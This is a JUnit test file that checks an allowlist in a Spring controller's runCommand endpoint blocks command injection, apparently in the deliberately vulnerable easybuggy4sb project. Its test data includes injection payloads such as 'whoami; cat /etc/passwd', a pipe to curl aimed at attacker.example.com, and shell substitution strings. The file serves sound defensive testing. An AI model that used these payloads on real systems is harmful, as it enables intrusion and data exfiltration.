package org.t246osslab.easybuggy4sb.controller;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.fail;

import java.io.IOException;
import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashSet;
import java.util.Set;

import org.junit.Before;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.mockito.InjectMocks;
import org.mockito.junit.MockitoJUnitRunner;
import org.springframework.http.HttpStatus;
import org.springframework.web.server.ResponseStatusException;

/**
 * Tests that CxController.runCommand is not vulnerable to command injection.
 *
 * Security assertions verified:
 *   1. Commands outside the allowlist are rejected with HTTP 400.
 *   2. Shell injection payloads (semicolons, pipes, backticks, etc.) are rejected.
 *   3. Path-based command injection (absolute/relative paths) is rejected.
 *   4. The ALLOWED_COMMANDS allowlist is non-empty and contains only safe diagnostics.
 *   5. The endpoint does NOT pass user input directly to Runtime.exec() as a shell string.
 */
@RunWith(MockitoJUnitRunner.class)
public class CxControllerTest {

    @InjectMocks
    private CxController controller;

    // =========================================================================
    // 1. Allowlist enforcement — commands not on the list are blocked
    // =========================================================================

    /**
     * An arbitrary OS command that is not in the allowlist must be rejected with
     * HTTP 400 BAD_REQUEST before any execution occurs.
     */
    @Test
    public void testArbitraryCommandIsRejected() {
        try {
            controller.runCommand("ls");
            fail("Expected ResponseStatusException for non-allowlisted command 'ls'");
        } catch (ResponseStatusException ex) {
            assertEquals("Expected HTTP 400 for disallowed command",
                    HttpStatus.BAD_REQUEST, ex.getStatus());
        } catch (IOException ex) {
            fail("Should not reach execution for a disallowed command: " + ex.getMessage());
        }
    }

    /**
     * An empty string is not in the allowlist and must be rejected.
     */
    @Test
    public void testEmptyCommandIsRejected() {
        try {
            controller.runCommand("");
            fail("Expected ResponseStatusException for empty command");
        } catch (ResponseStatusException ex) {
            assertEquals(HttpStatus.BAD_REQUEST, ex.getStatus());
        } catch (IOException ex) {
            fail("Should not reach execution for an empty command");
        }
    }

    // =========================================================================
    // 2. Shell injection payloads are blocked by the allowlist
    // =========================================================================

    /**
     * Semicolon-separated injection: "whoami; cat /etc/passwd".
     * The full string is not in the allowlist, so it must be rejected outright.
     */
    @Test
    public void testSemicolonInjectionPayloadIsRejected() {
        String payload = "whoami; cat /etc/passwd";
        assertCommandRejectedWithBadRequest(payload);
    }

    /**
     * Pipe-chained injection: "whoami | curl http://attacker.example.com".
     */
    @Test
    public void testPipeInjectionPayloadIsRejected() {
        String payload = "whoami | curl http://attacker.example.com";
        assertCommandRejectedWithBadRequest(payload);
    }

    /**
     * Ampersand background-execution injection: "whoami && id".
     */
    @Test
    public void testAmpersandInjectionPayloadIsRejected() {
        String payload = "whoami && id";
        assertCommandRejectedWithBadRequest(payload);
    }

    /**
     * Backtick command substitution injection: "whoami`id`".
     */
    @Test
    public void testBacktickInjectionPayloadIsRejected() {
        String payload = "whoami`id`";
        assertCommandRejectedWithBadRequest(payload);
    }

    /**
     * Dollar-paren command substitution: "$(id)".
     */
    @Test
    public void testDollarParenInjectionPayloadIsRejected() {
        String payload = "$(id)";
        assertCommandRejectedWithBadRequest(payload);
    }

    /**
     * Newline-based injection: "whoami\nid".
     * A raw newline character in the path variable should not reach exec.
     */
    @Test
    public void testNewlineInjectionPayloadIsRejected() {
        String payload = "whoami\nid";
        assertCommandRejectedWithBadRequest(payload);
    }

    // =========================================================================
    // 3. Path-based command injection is blocked
    // =========================================================================

    /**
     * Absolute path to a binary (/bin/sh) must not bypass the allowlist.
     */
    @Test
    public void testAbsolutePathCommandIsRejected() {
        assertCommandRejectedWithBadRequest("/bin/sh");
    }

    /**
     * Relative path traversal to reach a binary (../../bin/cat) must be rejected.
     */
    @Test
    public void testRelativePathTraversalCommandIsRejected() {
        assertCommandRejectedWithBadRequest("../../bin/cat");
    }

    /**
     * A shell interpreter invocation "sh -c id" must be rejected.
     */
    @Test
    public void testShellInterpreterInvocationIsRejected() {
        assertCommandRejectedWithBadRequest("sh -c id");
    }

    // =========================================================================
    // 4. Allowlist structure validation
    // =========================================================================

    /**
     * The ALLOWED_COMMANDS set must be non-null, non-empty, and contain only
     * simple command names without shell metacharacters or path separators.
     * This guards against a misconfigured allowlist that could re-introduce
     * injection risk.
     */
    @Test
    public void testAllowedCommandsListIsWellFormed() throws Exception {
        Set<String> allowed = getAllowedCommands();

        assertNotNull("ALLOWED_COMMANDS must not be null", allowed);
        assert !allowed.isEmpty() : "ALLOWED_COMMANDS must not be empty";

        for (String cmd : allowed) {
            assertNotNull("Each allowed command must not be null", cmd);
            assert !cmd.isEmpty() : "Each allowed command must not be empty";
            // Allowed commands should not contain shell metacharacters or path separators
            assert !cmd.contains(";")  : "Allowed command '" + cmd + "' must not contain ';'";
            assert !cmd.contains("|")  : "Allowed command '" + cmd + "' must not contain '|'";
            assert !cmd.contains("&")  : "Allowed command '" + cmd + "' must not contain '&'";
            assert !cmd.contains("`")  : "Allowed command '" + cmd + "' must not contain backtick";
            assert !cmd.contains("$")  : "Allowed command '" + cmd + "' must not contain '$'";
            assert !cmd.contains("/")  : "Allowed command '" + cmd + "' must not contain '/' (path traversal risk)";
            assert !cmd.contains("\\") : "Allowed command '" + cmd + "' must not contain '\\'";
            assert !cmd.contains(" ")  : "Allowed command '" + cmd + "' must not contain spaces (argument injection risk)";
        }
    }

    /**
     * The ALLOWED_COMMANDS set must be immutable to prevent runtime tampering.
     */
    @Test
    public void testAllowedCommandsListIsImmutable() throws Exception {
        Set<String> allowed = getAllowedCommands();
        try {
            allowed.add("rm");
            fail("ALLOWED_COMMANDS must be immutable — add() should throw UnsupportedOperationException");
        } catch (UnsupportedOperationException ex) {
            // expected — immutable set correctly rejects modification
        }
    }

    // =========================================================================
    // Helper utilities
    // =========================================================================

    /**
     * Asserts that runCommand(cmd) throws ResponseStatusException with HTTP 400.
     */
    private void assertCommandRejectedWithBadRequest(String cmd) {
        try {
            controller.runCommand(cmd);
            fail("Expected ResponseStatusException (HTTP 400) for command: " + cmd);
        } catch (ResponseStatusException ex) {
            assertEquals("Expected HTTP 400 BAD_REQUEST for disallowed command: " + cmd,
                    HttpStatus.BAD_REQUEST, ex.getStatus());
        } catch (IOException ex) {
            fail("Disallowed command '" + cmd + "' must not reach execution layer");
        }
    }

    /**
     * Reflectively reads the private static ALLOWED_COMMANDS field from CxController
     * to validate its structure without requiring a public accessor.
     */
    @SuppressWarnings("unchecked")
    private Set<String> getAllowedCommands() throws Exception {
        Field field = CxController.class.getDeclaredField("ALLOWED_COMMANDS");
        field.setAccessible(true);
        return (Set<String>) field.get(null);
    }
}
